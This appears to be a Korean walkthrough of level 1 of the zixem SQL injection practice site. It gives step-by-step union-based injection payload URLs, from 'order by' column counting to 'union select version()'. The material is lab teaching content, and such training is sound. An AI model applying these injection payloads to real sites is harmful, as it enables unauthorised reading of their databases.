# <p align="center">level 1</p>
> -문제 풀이
>> - 문제 조건
>> 1. zixem은 내가 원하는 데이터를 띄우는게 목적이다.
>> ##### ※우리가 원하는 데이터는 SQL의 버전으로 하겠다. 
>
>> - 문제 풀이
>> 1. 일단 sqli가 되는 환경인지 알아보기 위해 에러 유발인자를 넣어본다.
>> 2. sqli가 되는 환경인걸 확인했으면 order by를 사용해 컬럼의 갯수 확인<br/>
>>https://www.zixem.altervista.org/SQLi/level1.php?id=1 order by 1-- (O)<br/>
>>https://www.zixem.altervista.org/SQLi/levle1.php?id=1 order by 5-- (X)<br/>
>>https://www.zixem.altervista.org/SQLi/levle1.php?id=1 order by 3-- (O)<br/>
>> 3. 컬럼 갯수가 확인이 됐으면 컬럼마다 값을 하나씩 넣어본다.
>>https://www.zixem.altervista.org/SQLi/levle1.php?id=1 union select 1,2,3--
>> 4. 안될거다. 왜냐하면 임의로 값을 넣는 작업은 엄연히 문제가 생기기 때문에<br/>
>>사이트에서 원래 나올 정상값을 위에 덮어서 보여준다 따라서 에러를 일으켜 벗겨낸다.
>>https://www.zixem.altervista.org/SQLi/levle1.php?id=1234 union select 1,2,3--
>> 5. 화면에 나오는 넣은 값의 위치를 확인하고 우리가 원하는 값르 입력한다.
>>https://www.zixem.altervista.org/SQLi/levle1.php?id=1234 union select version(),2,3--